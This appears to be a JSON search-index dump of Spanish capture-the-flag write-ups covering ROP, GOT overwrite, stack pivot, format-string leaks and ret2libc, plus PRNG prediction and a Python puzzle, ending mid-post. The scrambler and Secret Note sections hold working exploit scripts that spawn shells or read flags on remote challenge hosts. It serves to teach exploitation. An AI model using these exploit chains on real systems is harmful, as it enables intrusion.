\u0026lt;__stack_chk_fail@plt\u0026gt; 401550: 48 83 c4 48 add rsp,0x48 401554: 5b pop rbx 401555: 5d pop rbp 401556: c3 ret 401557: 66 0f 1f 84 00 00 00 nop WORD PTR [rax+rax*1+0x0]  El programa está cogiendo el canario guardado mediante un offset a $rbp. Como hemos modificado $rbp, obviamente el valor que habrá en el offset no será igual al canario maestro (fs:0x28). Y entonces, el programa se cerrará inmediatemante (__stack_shk_fail).\nEste problema viene al usar la opción 2 para ejecutar la segunda ROP chain (que será la que imprima la flag). Como tenemos una primitiva \u0026ldquo;write-what-where\u0026rdquo; y $rbp tiene una dirección del binario, podemos calcular un offset a la tabla GOT (nótese que el binario tiene RELRO parcial, por lo que podemos modificar la GOT en tiempo de ejecución).\nLa GOT es una tabla que contiene las direcciones reales de las funciones externas o punteros a otra tabla de resolución si la función aún no ha sido usada. El objetivo es modificar el valor de la entrada de __stack_chk_fail, para que, aunque el canario guardado no coincida con el canario maestro, el programa no termine porque __stack_chk_fail no será resuelta a la función __stack_chk_fail real.\nPodemos visualizar la GOT en GDB:\n$ gdb -q scrambler_patched Reading symbols from scrambler_patched... (No debugging symbols found in scrambler_patched) gef➤ start [+] Breaking at entry-point: 0x401190  gef➤ got GOT protection: Partial RelRO | GOT functions: 11 [0x404018] seccomp_init → 0x401030 [0x404020] seccomp_rule_add → 0x401040 [0x404028] puts@GLIBC_2.2.5 → 0x401050 [0x404030] seccomp_load → 0x401060 [0x404038] __stack_chk_fail@GLIBC_2.4 → 0x401070 [0x404040] printf@GLIBC_2.2.5 → 0x401080 [0x404048] srand@GLIBC_2.2.5 → 0x401090 [0x404050] time@GLIBC_2.2.5 → 0x4010a0 [0x404058] setvbuf@GLIBC_2.2.5 → 0x4010b0 [0x404060] __isoc99_scanf@GLIBC_2.7 → 0x4010c0 [0x404068] rand@GLIBC_2.2.5 → 0x4010d0  Los valores anteriores son las entradas de la GOT cuando arranca el programa. Ninguna de las funciones está resuelta porque no se han llamado aún. Vamos a poner un breakpoint antes de cerrar el programa y así vemos cómo está la GOT:\ngef➤ break *0x401555 Breakpoint 1 at 0x401555 gef➤ run Starting program: ./scrambler_patched 1) Try scrambling 2) Quit \u0026gt; 2 Good bye! Breakpoint 1, 0x0000000000401555 in ?? ()  gef➤ got GOT protection: Partial RelRO | GOT functions: 11 [0x404018] seccomp_init → 0x7ffff7f94780 [0x404020] seccomp_rule_add → 0x7ffff7f94e50 [0x404028] puts@GLIBC_2.2.5 → 0x7ffff7e24450 [0x404030] seccomp_load → 0x7ffff7f94a90 [0x404038] __stack_chk_fail@GLIBC_2.4 → 0x401070 [0x404040] printf@GLIBC_2.2.5 → 0x7ffff7e01cc0 [0x404048] srand@GLIBC_2.2.5 → 0x401090 [0x404050] time@GLIBC_2.2.5 → 0x4010a0 [0x404058] setvbuf@GLIBC_2.2.5 → 0x7ffff7e24d10 [0x404060] __isoc99_scanf@GLIBC_2.7 → 0x7ffff7e030e0 [0x404068] rand@GLIBC_2.2.5 → 0x4010d0  Las entradas que aparecen en verde ya están resueltas. Y las que aparecen en amarillo no están resueltas porque no han sido llamadas en este punto de ejecución del programa.\nInicialmente, modifique la entrada de __stack_chk_fail por la entrada de rand. Entonces, solo tuve que modificar un byte (es decir, cambiar 0x70 por 0xd0).\nDe nuevo, tenemso que calcular el offset a esta dirección. Esta vez es más fácil porque sabemos que $rbp = 0x404200. Por tanto, el offset para llegar a 0x404038 (entrada de __stack_chk_fail en la GOT) será -0x200 + 0x38 + 0x20 (recordemos que la direcci´no base de la primitiva \u0026ldquo;write-what-where\u0026rdquo; ess $rbp - 0x20). Entonces, tenemos esta línea de código:\nwrite_what_where(p, 0xd0, -0x200 + 0x38 + 0x20)  En este punto, comencé a probar la segunda ROP chain. Pero\u0026hellip; Tampoco funcionaba porque $rsp seguía apuntando a direcciones de la pila (stack), por lo que no era capaz de modificar la dirección de retorno (que se almacena en la pila), ya que $rbp apunta a una dirección del binario (no hay offsets fijos entre los espacios de memoria de la pila, el binario o Glibc).\nDe nuevo, otro problema. Para solucionarlo, como $rbp está forzado a tener una dirección válida y la única que podemos poner es una dirección del binario, tenemos que cambiar $rsp también. Esta técnica se conoce como Stack Pivot, y consiste en mover el puntero de pila a un espacio de direcciones controlado.\nPara poder realizar el Stack Pivot, necesitamos un gadget como leave; ret, que es equivalente a mov rsp, rbp; pop rbp; ret. Por suerte, este gadget está en el binario:\n$ ROPgadget --binary scrambler | grep ': leave ; ret$' 0x0000000000401387 : leave ; ret  Y por tanto, en lugar de falsificar __stack_chk_fail para que sea rand, podemos falsificarla para que contenga la dirección del gadget leave; ret y realizar el Stack Pivot. Para ello, tenemos que modificar dos bytes: 0x70 pasará a ser 0x87 y 0x10 será 0x13, que se realiza con estas líneas de código (que reemplazan a la anterior):\nwrite_what_where(p, 0x87, -0x200 + 0x38 + 0x20) write_what_where(p, 0x13, -0x200 + 0x38 + 0x20 + 1)  Sorprendentemente, todo funciona como esperábamos. Ahora tenemos un proceso interactivo y la dirección de retorno se tomará de la nueva pila, que está entre las direcciones del binario. Ahora hay que realizar el truco para conseguir intentos de \u0026ldquo;scrambles\u0026rdquo; ilimitados otra vez. Y entonces, es momento de realizar la segunda ROP chain.\nEsta ROP chain es algo compleja, por lo que la dividiré en partes:\n Escribir \u0026quot;/home/ctf/flag.txt\u0026quot; en una dirección conocida Abrir el archivo de la flag Leer el archivo de la flag y guardar el contenido en una dirección conocida Mostrar el contenido del archivo de la flag  Como hemos fugado Glibc, ahora tenemos acceso a un montón de gadgets y funciones útiles. Los gadgets se pueden obtener con ROPgadget en el archivo libc.so_1.6. Estos son los gadgets que vamos a necesitar (aparte de pop rdi; ret):\nmov_qword_ptr_rax_rdi_ret = glibc.address + 0x09a0ff pop_rax_ret = glibc.address + 0x047400 pop_rsi_ret = glibc.address + 0x02604f pop_rdx_pop_r12_ret = glibc.address + 0x119241 pop_rcx_pop_rbx_ret = glibc.address + 0x1025ae  Para la primera parte, usaré este payload en bucle:\nflag = b'/home/ctf/flag.txt' flag = flag.ljust(len(flag) + (8 - len(flag) % 8), b'\\0') writable_addr = 0x404000 payload = b'' # Store \"/home/ctf/flag.txt\" in writable_addr for i in range(0, len(flag), 8): payload += p64(pop_rdi_ret) payload += flag[i:i + 8] payload += p64(pop_rax_ret) payload += p64(writable_addr + i) payload += p64(mov_qword_ptr_rax_rdi_ret)  La cadena de texto que contiene el nombre de archivo de la flag se rellena con bytes nulos hasta que tenga una longitud divisible entre 8. Luego, vamos a almacenar la cadena en trozos de 8 bytes en una dirección escribible (por ejemplo, 0x404000). El proceso utiliza mov qword ptr [rax], rdi; ret para guardar el contenido de $rdi en la dirección a la que apunta $rax. GDB puede ser útil para seguir la ejecución de la ROP chain y asegurar que el texto se guarda correctamente.\nDespués, tenemos que llamar a open(\u0026quot;/home/ctf/flag.txt\u0026quot;, O_RDONLY). Nótese que O_RDONLY es un alias del valor 0 y que sabemos la dirección donde está guardada la cadena de texto con el nombre del archivo.\nPrimeramente, utilicé directamente la función open de Glibc, pero las reglas seccomp me bloqueaban el proceso. A lo mejor la función utiliza más llamadas de sistema. Luego, miré por gadgets con syscall: el binario no tiene ninguna y Glibc tiene muchas, pero ninguna termina en ret, por lo que no las podemos usar en una ROP chain:\n$ ROPgadget --binary scrambler | grep syscall $ ROPgadget --binary libc.so_1.6 | grep syscall | wc -c 153930 $ ROPgadget --binary libc.so_1.6 | grep syscall | grep ret$  De nuevo, otro punto muerto\u0026hellip; Pero luego me di cuenta de que Glibc tiene una función que se llama precisamente syscall:\n$ readelf -s libc.so_1.6 | grep syscall 1980: 0000000000118750 55 FUNC GLOBAL DEFAULT 15 syscall@@GLIBC_2.2.5  A lo mejor podemos usar esta función en la ROP chain, eso resolvería el problema. Una cosa a tener en cuenta es que los valores de los registros al ejecutar syscall ($rax, $rdi, $rsi, $rdx, $rcx\u0026hellip;) se pasan a la función syscall como argumentos, por lo que $rdi = $rax, $rsi = $rdi, $rdx = $rsi, $rcx = $rdx\u0026hellip; Esto puede ser un poco confuso, y por eso añadí comentarios en el código:\n# syscall: open(\"/home/ctf/flag.txt\", 0) payload += p64(pop_rdi_ret) payload += p64(2) # rdi (rax) payload += p64(pop_rsi_ret) payload += p64(writable_addr) # rsi (rdi) payload += p64(pop_rdx_pop_r12_ret) payload += p64(0) # rdx (rsi) payload += p64(0) payload += p64(syscall)  La instrucción sys_open se ejecuta cuando $rax = 2. Luego, tenemos que usar sys_read ($rax = 0). El descriptor de archivo será 3 (porque 0, 1 y 2 está reservados para stdin, stdout y stderr). Aún así, se puece mirar el número del descriptor de archivo al ejecutar sys_open, el descriptor de archivo resultante se devuelve en $rax (y es 3). Con esto, esta es la ROP chain para sys_read:\n# syscall: read(3, writable_addr, 0x100) payload += p64(pop_rdi_ret) payload += p64(0) # rdi (rax) payload += p64(pop_rsi_ret) payload += p64(3) # rsi (rdi) payload += p64(pop_rdx_pop_r12_ret) payload += p64(writable_addr) # rdx (rsi) payload += p64(0) payload += p64(pop_rcx_pop_rbx_ret) payload += p64(0x100) # rcx (rdx) payload += p64(0) payload += p64(syscall)  El número 0x100 es solo para especificar la cantidad de bytes a leer del descriptor de archivo (presumiblemente, no necesitaremos tantos).\nFinalmente, para imprimir la flag por pantalla, podríamos haber usado sys_write (siguiendo el procedimiento de ROP chain con syscall), pero creo que es más sencillo usar puts:\n# puts(writable_addr) payload += p64(pop_rdi_ret) payload += p64(writable_addr) payload += p64(glibc.sym.puts)  Y esto es todo. Ahora solo tenemos que usar la primitiva \u0026ldquo;write-what-where\u0026rdquo; de la misma manera que la usamos en la primera ROP chain y ejecutarla con la opción 2.\nVamos a probar en local:\n$ echo 'flag{this_is_the_flag!!}' \u0026gt; /home/ctf/flag.txt $ python3 solve.py [*] './scrambler_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './scrambler_patched': pid 447414 [*] Leaked puts() address: 0x7f028c526450 [*] Glibc base address: 0x7f028c4a2000 [*] Switching to interactive mode Good bye! flag{this_is_the_flag!!} gi\\x8c\\x7f [*] Got EOF while reading in interactive $  ¡¡Funciona!! Vamos a ver en remoto (puede tomar algo de tiempo en terminar, alrededor de 10 minutos):\n$ python3 solve.py 20.203.124.220 1235 [*] './scrambler_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Opening connection to 20.203.124.220 on port 1235: Done [*] Leaked puts() address: 0x7f3c9865e450 [*] Glibc base address: 0x7f3c985da000 [*] Switching to interactive mode Good bye! Securinets{f8ee583021b816b1b557987ca120991a} \\x7f [*] Got EOF while reading in interactive $  El exploit completo se puede encontrar aquí: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/other/scrambler/","section":"ctf","summary":"Securinets Finals 2022. Binario de 64 bits. ROP. Ret2Libc. Sobrescritura de la GOT. Stack Pivot. Reglas seccomp","time":18,"title":"scrambler"},{"contents":"Se nos proporciona un binario de 64 bits llamado main:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled  Si abrimos el binario en Ghidra, veremos las siguientes funciones:\nvoidget_name() { longin_FS_OFFSET; charname[40]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); puts(\"Please fill in your name:\"); read(0, name, 30); printf(\"Thank you \"); printf(name); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } } intmain() { longin_FS_OFFSET; charsecret[56]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); setvbuf(stderr, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); get_name(); puts(\"So let\\'s get into business, give me a secret to exploit me :).\"); gets(secret); puts(\"Bye, good luck next time :D \"); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return0; }  Existen dos vulnerabilidades: un Buffer Overflow debido al uso de gets, y una vulnerabilidad de Format String por el uso de printf con una variable controlada como primer parámetro.\nComo todas las protecciones están habilitadas, tendremos que fugar el canario de la pila, una dirección del binario en tiempo de ejecución para burlar PIE y una direccón de Glibc para burlar ASLR.\nDe momento, podemos enumerar la vulnerabilidad de Format String\n$ ./main Please fill in your name: %lx Thank you 7fffffffbff0 So let's get into business, give me a secret to exploit me :). ^C  Esto es solo una prueba de concepto, hemos fugado un valor de la pila usando el formato %lx. Vamos a ver qué podemos obtener de la pila (stack). Para eso, hice un pequeño bucle mediante shell scripting:\n$ for i in {1..30}; do echo -n \"$i: \"; echo \"%$i\\$lx\\n\" | ./main | head -2 | tail -1 | awk '{ print $3 }'; done 1: 7fffffffbff0 2: 0 3: 0 4: a 5: a 6: a0a786c243625 7: 7ffff7e41de5 8: 555555555310 9: 7fffffffe710 10: 555555555100 11: 63acce113dd9c300 12: 7fffffffe710 13: 5555555552c5 14: 7fffffffe6f6 15: 55555555535d 16: 7ffff7fae2e8 17: 555555555310 18: 0 19: 555555555100 20: 7fffffffe800 21: 23c748f15ffbef00 22: 0 23: 7ffff7de1083 24: 7ffff7ffc620 25: 7fffffffe808 26: 100000000 27: 555555555264 28: 555555555310 29: 774f9dc3d5661ab7 30: 555555555100  El canario de la pila es fácil de reconocer porque siempre es aleatorio y termina en un byte nulo. Lo encontrarmos en la posición 11.\nLuego, podemos ver algunas direcciones que empiezan por 555555555. Estas son direcciones del binario (desactivé ASLR temporalmente). La dirección en la posición 27 termina en 264, y coincide con el offsset de main:\n$ readelf -s main | grep main 6: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.2.5 (2) 56: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@@GLIBC_ 66: 0000000000001264 165 FUNC GLOBAL DEFAULT 16 main  Así, obtenemos una manera de fugar el canario y la dirección del main. Vamos a comenzar con el exploit en Python:\ndefget_canary_main_addr(p): p.sendlineafter(b'Please fill in your name:\\n', b'%11$lx.%27$lx') p.recvuntil(b'Thank you ') canary, main_addr=map(lambdax: int(x, 16), p.recvline().split(b'.')) log.info(f'Leaked canary: {hex(canary)}') log.info(f'Leaked main() address: {hex(main_addr)}') returncanary, main_addr defmain(): p=get_process() canary, main_addr=get_canary_main_addr(p) elf.address=main_addr-elf.sym.main log.info(f'ELF base address: {hex(elf.address)}') if__name__=='__main__': main()  $ python3 solve.py [*] './main' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process './main': pid 1642002 [*] Leaked canary: 0xfafefec6ed0f4e00 [*] Leaked main() address: 0x555555555264 [*] ELF base address: 0x555555554000 [*] Stopped process './main' (pid 1642002)  Todo bien. Ahora toca explotar la vulnerabilidad de Buffer Overflow.\nAunque podía haber obtenido una fuga de memoria de Glibc usando la vulnerabilidad de Format String, decidí realizar un ataque Ret2Libc común con bypass de ASLR. Esto consiste en llamar a puts mediante la Tabla de Enlaces a Procedimientos (PLT) configurando la entrada de una función en la Tabla de Offsets Globales (GOT) como primer argumento, mediante Return Oriented Programming (ROP). Usaré pwntools directamente para ahorrar tiempo:\nrop=ROP(elf) offset=56 junk=b'A'*offset leaked_function='setvbuf' payload=junk payload+=p64(canary) payload+=p64(0) payload+=p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload+=p64(elf.got[leaked_function]) payload+=p64(elf.plt.puts) payload+=p64(elf.sym.main) p.sendlineafter(b'So let\\'s get into business, give me a secret to exploit me :).\\n', payload) p.recvline() leaked_function_addr=u64(p.recvline().strip().ljust(8, b'\\0')) log.info(f'Leaked {leaked_function}() address: {hex(leaked_function_addr)}') glibc.address=leaked_function_addr-glibc.sym[leaked_function] log.info(f'Glibc base address: {hex(glibc.address)}')  $ python3 solve.py [*] './main' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process './main': pid 1644101 [*] Leaked canary: 0x45c2abc35c668400 [*] Leaked main() address: 0x555555555264 [*] ELF base address: 0x555555554000 [*] Loaded 14 cached gadgets for 'main' [*] Leaked setvbuf() address: 0x7ffff7e41ce0 [*] Glibc base address: 0x7ffff7dbd000 [*] Stopped process './main' (pid 1644101)  Perfecto, y ahora que tenemos la dirección base de Glibc, podemos llamar a system(\u0026quot;/bin/sh\u0026quot;). Nótese que hemos retornado al main, por lo que tenemos que enviar otro \u0026ldquo;nombre\u0026rdquo; antes de explotar la vulnerabilidad de Buffer Overflow otra vez:\np.sendline() payload=junk payload+=p64(canary) payload+=p64(0) payload+=p64(rop.find_gadget(['ret'])[0]) payload+=p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload+=p64(next(glibc.search(b'/bin/sh'))) payload+=p64(glibc.sym.system) p.sendlineafter(b'So let\\'s get into business, give me a secret to exploit me :).\\n', payload) p.recvline() p.interactive()  Si activo ASLE, todo funciona bien y obtengo una shell en local:\n$ python3 solve.py [*] './main' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process './main': pid 1645479 [*] Leaked canary: 0x90b02c1284165b00 [*] Leaked main() address: 0x55f24178f264 [*] ELF base address: 0x55f24178e000 [*] Loaded 14 cached gadgets for 'main' [*] Leaked setvbuf() address: 0x7f11f3e87ce0 [*] Glibc base address: 0x7f11f3e03000 [*] Switching to interactive mode $ ls main solve.py  Ahora tenemos que ejecutarlo en remoto y encontrar la versión de Glibc adecuada. Mediante dos fugas de memoria de Glibc, vemos que la instancia remota utiliza Glibc 2.27 (libc.rip):\nPodríamos haber visto también que el Dockerfile comenzaba por FROM ubuntu:18.04.\nUna vez modificado el exploit obtenemos una shell en la instancia remota:\n$ python3 solve.py blackhat2-a7c0aeda4583a436e729b57c9ff83838-0.chals.bh.ctf.sa [*] './main' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to blackhat2-a7c0aeda4583a436e729b57c9ff83838-0.chals.bh.ctf.sa on port 443: Done [*] Leaked canary: 0xf085d069ad9c9a00 [*] Leaked main() address: 0x55993e81a264 [*] ELF base address: 0x55993e819000 [*] Loading gadgets for './main' [*] Leaked setvbuf() address: 0x7f93c19df2a0 [*] Glibc base address: 0x7f93c195e000 [*] Switching to interactive mode $ cat flag.txt BlackHatMEA{96:21:9f27d3e8d68fd8bbfb5b88a969e6ff4054624b6c}  El exploit completo se puede encontrar aquí: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/other/secret-note/","section":"ctf","summary":"BlackHat MEA CTF 2022. Binario de 64 bits. Buffer Overflow. Vulnerabilidad de Format String. Ret2Libc. Bypass de PIE y canario","time":4,"title":"Secret Note"},{"contents":"Se nos proporciona un binario de 32 bits llamado seed_spring:\nArch: i386-32-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled  Esta vez no tenemos el código fuente. Sin embargo, podemos utilizar una herramienta de ingeniería inversa (reversing) como Ghidra para descompilar el binario y obtener código en C más o menos legible. Esta es la función main:\nvoid main() { uint local_20; uint local_1c; uint local_18; int local_14; undefined *local_10; local_10 = \u0026amp;stack0x00000004; puts(\"\"); puts(\"...\"); puts(\"\"); puts(\"Welcome! The game is easy: you jump on a sPRiNG.\"); puts(\"How high will you fly?\"); puts(\"\"); fflush(stdout); local_18 = time((time_t *) 0x0); srand(local_18); local_14 = 1; while(true) { if (0x1e \u0026lt; local_14) { puts(\"Congratulation! You\\'ve won! Here is your flag:\\n\"); fflush(stdout); get_flag(); fflush(stdout); return 0; } printf(\"LEVEL (%d/30)\\n\", local_14); puts(\"\"); local_1c = rand(); local_1c = local_1c \u0026amp; 0xf; printf(\"Guess the height: \"); fflush(stdout); __isoc99_scanf(\"%d\", \u0026amp;local_20); fflush(stdin); if (local_1c != local_20) break; local_14 = local_14 + 1; } puts(\"WRONG! Sorry, better luck next time!\"); fflush(stdout); /* WARNING: Subroutine does not return */ exit(-1); }  Lo que hace el programa es configurar una semilla para un Generador de Números Pseudo Aleatorios (PRNG en inglés) y llamarlo 30 veces. La operación AND con 0xf se aplica al valor devuelto por rand, y después el programa comprueba si la entrada del usuario es igual al resultado de la operación AND. Si el resultado es correcto, pasamos al siguiente nivel. Y si no, el programa termina.\nUna manera de saber los valores aleatorios exactos que se van a calcular es utilizar el mismo PRNG e inicializarlo con la misma semilla. Para ese propósito, podemos construir un simple programa en C:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main() { int i; srand(time(0)); for (i = 0; i \u0026lt; 30; i++) { printf(\"%d\\n\", rand() \u0026amp; 0xf); } return 0; }  Si lo compilamos y lo ejecutamos, veremos 30 valores aleatorios generados:\n$ gcc -o prng prng.c $ ./prng 10 6 3 14 14 0 10 8 1 13 1 10 5 0 2 15 1 9 4 12 3 7 4 5 0 15 14 15 7 14  Y si ahora introducimos este resultado con entrada al binario seed_spring, ganaremos el juego:\n$ ./prng | ./seed_spring # mmmmm mmmmm \" mm m mmm mmm mmm mmm mmm# mmm # \"# # \"# mmm #\"m # m\" \" # \" #\" # #\" # #\" \"# # \" #mmm#\" #mmmm\" # # #m # # mm \"\"\"m #\"\"\"\" #\"\"\"\" # # \"\"\"m # # \"m # # # # # # \"mmm\" \"#mm\" \"#mm\" \"#m## \"mmm\" # # \" mm#mm # ## \"mmm\" Welcome! The game is easy: you jump on a sPRiNG. How high will you fly? LEVEL (1/30) Guess the height: LEVEL (2/30) Guess the height: LEVEL (3/30) ... Guess the height: LEVEL (29/30) Guess the height: LEVEL (30/30) Guess the height: Congratulation! You've won! Here is your flag: cat: flag.txt: No such file or directory  Genial, el programa está intentando ejecutar cat flag.txt (falla porque no tenemos un archivo llamado flag.txt).\nVamos a realizar lo mismo en la instancia remota a ver si nos da la flag:\n$ ./prng | nc jupiter.challenges.picoctf.org 35856 # mmmmm mmmmm \" mm m mmm mmm mmm mmm mmm# mmm # \"# # \"# mmm #\"m # m\" \" # \" #\" # #\" # #\" \"# # \" #mmm#\" #mmmm\" # # #m # # mm \"\"\"m #\"\"\"\" #\"\"\"\" # # \"\"\"m # # \"m # # # # # # \"mmm\" \"#mm\" \"#mm\" \"#m## \"mmm\" # # \" mm#mm # ## \"mmm\" Welcome! The game is easy: you jump on a sPRiNG. How high will you fly? LEVEL (1/30) Guess the height: LEVEL (2/30) Guess the height: LEVEL (3/30) ... Guess the height: LEVEL (29/30) Guess the height: LEVEL (30/30) Guess the height: Congratulation! You've won! Here is your flag: picoCTF{pseudo_random_number_generator_not_so_random_5308efc8}  El código para el PRNG se puede encontrar aquí: prng.c.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/seed-spring/","section":"ctf","summary":"picoCTF 2019. 350 puntos. Binario de 32 bits. PRNG. Desarrollo de un programa con el mismo PRNG y la misma semilla","time":3,"title":"seed-sPRiNG"},{"contents":"Se nos proporciona un script de Python que debería mostrar la flag, pero no lo hace:\nimport random import sys def str_xor(secret, key): # extend key to secret length new_key = key i = 0 while len(new_key) \u0026lt; len(secret): new_key = new_key + key[i] i = (i + 1) % len(key) return \"\".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c, new_key_c) in zip(secret, new_key)]) flag_enc = chr(0x15) + chr(0x07) + chr(0x08) + chr(0x06) + chr(0x27) + chr(0x21) + chr(0x23) + chr(0x15) + chr(0x5c) + chr(0x01) + chr(0x57) + chr(0x2a) + chr(0x17) + chr(0x5e) + chr(0x5f) + chr(0x0d) + chr(0x3b) + chr(0x19) + chr(0x56) + chr(0x5b) + \\ chr(0x5e) + chr(0x36) + chr(0x53) + chr(0x07) + chr(0x51) + chr(0x18) + chr(0x58) + chr(0x05) + chr(0x57) + chr(0x11) + \\ chr(0x3a) + chr(0x0c) + chr(0x5d) + chr(0x5c) + chr(0x52) + \\ chr(0x42) + chr(0x50) + chr(0x5a) + chr(0x5d) + chr(0x14) def print_flag(): flag = str_xor(flag_enc, 'enkidu') print(flag) def print_encouragement(): encouragements = ['You can do it!', 'Keep it up!', 'Look how far you\\'ve come!'] choice = random.choice(range(0, len(encouragements))) print('\\n-----------------------------------------------------') print(encouragements[choice]) print('-----------------------------------------------------\\n\\n') def main(): print( ''' Y ··.-^-. / \\ .- ~ ~ -. () () / _ _ `. _ _ _ \\_ _/ /··/ \\ \\ . ~··_ _··~ . | | /··/ \\ \\ .' .~ ~-. `. | | /··/ ) ) /··/ `.`. \\ \\_ _/··/ / / /··/ `' \\_ _ _.' / / (··( / / \\··\\\\ / / \\··\\\\ / / )··) ( ( /··/ `.··`. .'··/ `. ~ - - - - ~ .' ~ . _ _ _ _ . ~ ''' ) print('Welcome to the serpentine encourager!\\n\\n') while True: print('a) Print encouragement') print('b) Print flag') print('c) Quit\\n') choice = input('What would you like to do? (a/b/c) ') if choice == 'a': print_encouragement() elif choice == 'b': print( '\\nOops! I must have misplaced the print_flag function! Check my source code!\\n\\n') elif choice == 'c': sys.exit(0) else: print('\\nI did not understand \"' + choice + '\", input only \"a\", \"b\" or \"c\"\\n\\n') if __name__ == \"__main__\": main()  El problema está en que la opción \u0026ldquo;b\u0026rdquo; no está llamando a print_flag como debería:\n$ python3 serpentine.py Y .-^-. / \\ .- ~ ~ -. () () / _ _ `. _ _ _ \\_ _/ / / \\ \\ . ~ _ _ ~ . | | / / \\ \\ .' .~ ~-. `. | | / / ) ) / / `.`. \\ \\_ _/ / / / / / `' \\_ _ _.' / / ( ( / / \\ \\ / / \\ \\ / / ) ) ( ( / / `. `. .' / `. ~ - - - - ~ .' ~ . _ _ _ _ . ~ Welcome to the serpentine encourager! a) Print encouragement b) Print flag c) Quit What would you like to do? (a/b/c) b Oops! I must have misplaced the print_flag function! Check my source code! a) Print encouragement b) Print flag c) Quit What would you like to do? (a/b/c) c  Una manera elegante de llamarla es importando el script desde una sesión interactiva de Python, de manera que podamos llamar a la función directamente (sin necesidad de realizar ingeniería inversa):\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from serpentine import print_flag \u0026gt;\u0026gt;\u0026gt; print_flag() picoCTF{7h3_r04d_l355_7r4v3l3d_b6567546}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/picoctf/general-skills/serpentine/","section":"ctf","summary":"Beginner picoMini 2022. 100 puntos. Script de Python","time":2,"title":"Serpentine"},{"contents":"Este reto es la continuación de RIP my bof. Échale un vistazo si no lo has visto ya.\nAhora, la flag está en /flag2.txt, por lo que tenemos que conseguir algo más que redirigir la ejecución del programa a system(\u0026quot;cat /flag.txt\u0026quot;), como en RIP my bof.\nLo primero que pensé es Ret2Libc. La idea es obtener una consola de comandos llamando a system dentro de Glibc con argumento \u0026quot;/bin/sh\u0026quot;.\nPara ese propósito, necesitamos burlar ASLR, porque Glibc es una librería de sistema y está afectada por la aleatorización de direcciones si ASLR está habilitado (probablemente sí). Esto se puede hacer mediante una fuga (leak) de una dirección de alguna función de Glibc en tiempo de ejecución. Con esta información, podremos extraer los tres últimos dígitos hexadecimales y buscar por la versión de Glibc. Una vez que la tengamos, tendremos que obtener el offset de system y de la cadena \u0026quot;/bin/sh\u0026quot;. Esto se explicará mejor más adelante.\nEl binario se llama server, y es de 32 bits y tiene NX habilitado. Si lo ejecutamos, vemos la pila (stack) y el valor de $eip (lo cual es una ayuda para el reto RIP my bof). El texto de entrada se lee mediante gets, que es una función vulnerable a Buffer Overflow.\nPara realizar la técnica de Ret2Libc, primero necesitamos una dirección de Glibc en tiempo de ejecución. Esto se puede hacer llamando a la función puts y pasándole como argumento la dirección de una función en la Tabla de Offsets Globales (Global Offset Table, GOT), de manera que el valor de esa dirección se imprima en la salida estándar (el valor de una entrada de la GOT es la dirección real de una función externa, si ya ha sido resuelta).\nPara llamar a puts, tenemos que sobrescribir $eip con la entrada de puts en la Tabla de Enlaces a Procedimientos (Procedure Linkage Table, PLT), que contiene instrucciones que realizan un salto a la GOT o gestiona la resolución de la dirección si la entrada de la GOT está vacía.\nLa dirección de puts en la PLT se puede obtener con objdump:\n$ objdump -d server | grep puts 08048410 \u0026lt;puts@plt\u0026gt;: 8048704: e8 07 fd ff ff call 8048410 \u0026lt;puts@plt\u0026gt; 8048716: e8 f5 fc ff ff call 8048410 \u0026lt;puts@plt\u0026gt; 8048846: e8 c5 fb ff ff call 8048410 \u0026lt;puts@plt\u0026gt; 8048881: e8 8a fb ff ff call 8048410 \u0026lt;puts@plt\u0026gt;  Ahora necesitamos una dirección de la GOT, por ejemplo, la misma función puts. De nuevo, con objdump o con readelf:\n$ objdump -R server | grep puts 0804a018 R_386_JUMP_SLOT puts@GLIBC_2.0 $ readelf -r server | grep puts 0804a018 00000407 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0  Finalmente, necesitamos indicar una dirección de retorno. Como necesitaremos enviar otro payload, tenemos que ejecutar el programa otra vez pero sin cerrar el proceso. Por tanto, la instrucción de retorno tiene que ser la dirección del main:\n$ objdump -d server | grep main 08048430 \u0026lt;__libc_start_main@plt\u0026gt;: 804849d: e8 8e ff ff ff call 8048430 \u0026lt;__libc_start_main@plt\u0026gt; 08048640 \u0026lt;main\u0026gt;: $ readelf -s server | grep main 7: 00000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.0 (2) 61: 00000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@@GLIBC_ 73: 08048640 90 FUNC GLOBAL DEFAULT 14 main  Ahora que tenemos estos valores, podemos enviar el payload. Este estará formado por 60 bytes de relleno (tomado de RIP my bof), la dirección de puts en la PLT, la dirección de retorno (main) y el argumento para 